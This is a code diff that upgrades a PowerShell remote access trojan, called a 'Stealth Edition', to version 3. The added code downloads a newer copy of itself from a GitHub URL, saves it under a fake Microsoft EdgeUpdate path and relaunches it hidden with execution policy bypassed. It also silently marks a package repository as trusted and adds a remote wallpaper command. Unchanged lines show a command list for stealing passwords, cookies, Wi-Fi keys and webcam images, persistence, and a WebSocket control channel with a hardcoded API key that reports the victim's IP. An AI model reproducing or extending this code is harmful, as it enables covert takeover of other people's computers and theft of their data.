@@ -1,5 +1,5 @@
-# RAT WebSocket Client - Full Featured Stealth Edition v2
-# Fixed version with infinite retry, better error handling, and improved commands
+# RAT WebSocket Client - Full Featured Stealth Edition v3
+# Auto-update, fixed toast notifications, infinite retry
 
 # Force run as hidden job if not already
 $myPID = $PID
@@ -43,8 +43,56 @@ public class InputControl {
 
 $global:uid = "$env:COMPUTERNAME-$env:USERNAME"
 $wssUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/url"
+$scriptUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1"
 $botPrefix = "/"
 $persistEnabled = $false
+$global:scriptVersion = "3.0"
+
+# Install BurntToast for notifications
+function Install-BurntToast {
+    try {
+        if (-not (Get-Module -ListAvailable -Name BurntToast)) {
+            Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
+            Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction Stop
+        }
+        Import-Module BurntToast -ErrorAction Stop
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+# Auto-update function
+function Check-Update {
+    try {
+        $latestScript = Invoke-WebRequest -Uri $scriptUrlFile -UseBasicParsing -TimeoutSec 10
+        $latestContent = $latestScript.Content
+        
+        # Extract version from latest script
+        if ($latestContent -match '\$global:scriptVersion = "([^"]+)"') {
+            $latestVersion = $matches[1]
+            
+            if ($latestVersion -ne $global:scriptVersion) {
+                # Update available
+                $targetPath = "$env:APPDATA\Microsoft\EdgeUpdate\updater.ps1"
+                
+                # Backup current version
+                if (Test-Path $targetPath) {
+                    Copy-Item $targetPath "$targetPath.bak" -Force
+                }
+                
+                # Download new version
+                Set-Content -Path $targetPath -Value $latestContent -Force
+                
+                # Restart with new version
+                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File `"$targetPath`"" -WindowStyle Hidden
+                exit
+            }
+        }
+    } catch {
+        # Silent fail, continue with current version
+    }
+}
 
 function Get-WssUrl {
     $retries = 0
@@ -59,11 +107,9 @@ function Get-WssUrl {
         }
         
         $retries++
-        # Wait longer each retry (30s, 60s, 120s, max 300s)
         $waitTime = [Math]::Min(30 * [Math]::Pow(2, [Math]::Min($retries - 1, 3)), 300)
         Start-Sleep -Seconds $waitTime
         
-        # Fallback after 5 retries
         if ($retries -ge 5) {
             return "wss://free.blr2.piesocket.com/v3/1?api_key=bJpyvYTy22qCCTlsfwEpe7IOhGiMzoNy3YJqTMp6&notify_self=1"
         }
@@ -177,6 +223,7 @@ function Get-SystemInfo {
     
     return @"
 UID: $global:uid
+Version: $global:scriptVersion
 Hostname: $env:COMPUTERNAME
 Username: $env:USERNAME
 OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
@@ -689,25 +736,14 @@ function Show-ToastNotification {
         Start-Job -ScriptBlock {
             param($t, $m)
             
-            [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
-            [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
+            # Install BurntToast if not available
+            if (-not (Get-Module -ListAvailable -Name BurntToast)) {
+                Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
+                Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction Stop
+            }
             
-            $template = @"
-<toast>
-    <visual>
-        <binding template="ToastGeneric">
-            <text>$t</text>
-            <text>$m</text>
-        </binding>
-    </visual>
-</toast>
-"@
-            
-            $xml = New-Object Windows.Data.Xml.Dom.XmlDocument
-            $xml.LoadXml($template)
-            
-            $toast = New-Object Windows.UI.Notifications.ToastNotification($xml)
-            [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell").Show($toast)
+            Import-Module BurntToast -ErrorAction Stop
+            New-BurntToastNotification -Text $t, $m -ErrorAction Stop
         } -ArgumentList $title, $message | Out-Null
         
         return "Toast sent: $title - $message"
@@ -734,15 +770,28 @@ function Invoke-SpamNotifications {
     try {
         Start-Job -ScriptBlock {
             param($cnt)
-            Add-Type -AssemblyName System.Windows.Forms
+            
+            # Install BurntToast if needed
+            if (-not (Get-Module -ListAvailable -Name BurntToast)) {
+                Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
+                Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+            }
+            
+            Import-Module BurntToast -ErrorAction SilentlyContinue
             
             for ($i = 1; $i -le $cnt; $i++) {
-                $balloon = New-Object System.Windows.Forms.NotifyIcon
-                $balloon.Icon = [System.Drawing.SystemIcons]::Information
-                $balloon.Visible = $true
-                $balloon.ShowBalloonTip(3000, "Notification #$i", "Message number $i", [System.Windows.Forms.ToolTipIcon]::Info)
+                try {
+                    New-BurntToastNotification -Text "Notification #$i", "Message number $i" -ErrorAction Stop
+                } catch {
+                    # Fallback to balloon
+                    Add-Type -AssemblyName System.Windows.Forms
+                    $balloon = New-Object System.Windows.Forms.NotifyIcon
+                    $balloon.Icon = [System.Drawing.SystemIcons]::Information
+                    $balloon.Visible = $true
+                    $balloon.ShowBalloonTip(3000, "Notification #$i", "Message number $i", [System.Windows.Forms.ToolTipIcon]::Info)
+                    $balloon.Dispose()
+                }
                 Start-Sleep -Milliseconds 500
-                $balloon.Dispose()
             }
         } -ArgumentList $count | Out-Null
         
@@ -802,6 +851,41 @@ function Invoke-KillExplorer {
     }
 }
 
+function Set-Wallpaper {
+    param([string]$url)
+    
+    try {
+        $ext = [System.IO.Path]::GetExtension($url)
+        if (-not $ext) { $ext = ".jpg" }
+        
+        $wallpaperPath = "$env:TEMP\wallpaper_$(Get-Random)$ext"
+        Invoke-WebRequest -Uri $url -OutFile $wallpaperPath -UseBasicParsing
+        
+        if (-not (Test-Path $wallpaperPath)) {
+            return "Failed to download wallpaper"
+        }
+        
+        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@ -ErrorAction SilentlyContinue
+        
+        $SPI_SETDESKWALLPAPER = 0x0014
+        $SPIF_UPDATEINIFILE = 0x01
+        $SPIF_SENDCHANGE = 0x02
+        
+        [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $wallpaperPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
+        
+        return "Wallpaper changed successfully"
+    } catch {
+        return "Wallpaper change failed: $($_.Exception.Message)"
+    }
+}
+
 function Remove-SelfDelete {
     try {
         $scriptPath = $PSCommandPath
@@ -857,6 +941,10 @@ function Process-Command {
     
     switch ($cmd) {
         "info" { return Get-SystemInfo }
+        "update" { 
+            Check-Update
+            return "Checking for updates..."
+        }
         "exec" {
             if ($args.Count -gt 0) {
                 return Execute-Command -cmd ($args -join ' ')
@@ -964,6 +1052,12 @@ function Process-Command {
         "hide" { return Invoke-HideWindow }
         "logout" { return Invoke-Logout }
         "killsis" { return Invoke-KillExplorer }
+        "wallpaper" {
+            if ($args.Count -gt 0) {
+                return Set-Wallpaper -url $args[0]
+            }
+            return "Usage: /wallpaper <image_url>"
+        }
         "selfdestruct" { return Remove-SelfDelete }
         "persist" {
             if ($args.Count -gt 0 -and $args[0] -eq "on") {
@@ -994,20 +1088,26 @@ function Process-Command {
         "exit" { return "EXIT_SIGNAL" }
         "help" {
             return @"
-Commands: /info /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake [seconds] /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /persist /processes /kill /selfdestruct /exit
+Commands: /info /update /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake [sec] /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /wallpaper /persist /processes /kill /selfdestruct /exit
+Version: $global:scriptVersion
 "@
         }
         default { return "Unknown: /help" }
     }
 }
 
+# Initialize
+Install-BurntToast | Out-Null
 $wasFirstRun = Initialize-Persistence
 $persistEnabled = Check-Persistence
+
+# Check for updates on startup
+Check-Update
 
 # Main loop with infinite retry
 while ($true) {
     try {
-        $wssUrl = Get-WssUrl  # This now retries infinitely until successful
+        $wssUrl = Get-WssUrl
         
         $ws = New-Object System.Net.WebSockets.ClientWebSocket
         $ct = New-Object System.Threading.CancellationToken
@@ -1027,7 +1127,7 @@ while ($true) {
             }
             
             $autoStartMsg = if ($wasFirstRun) { " | AUTO-PERSISTENCE ENABLED" } else { "" }
-            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Persist: $persistEnabled$autoStartMsg"
+            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Version: $global:scriptVersion | Persist: $persistEnabled$autoStartMsg"
             $initBytes = [System.Text.Encoding]::UTF8.GetBytes($initMsg)
             $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($initBytes), 'Text', $true, $ct)
             $sendTask.Wait()
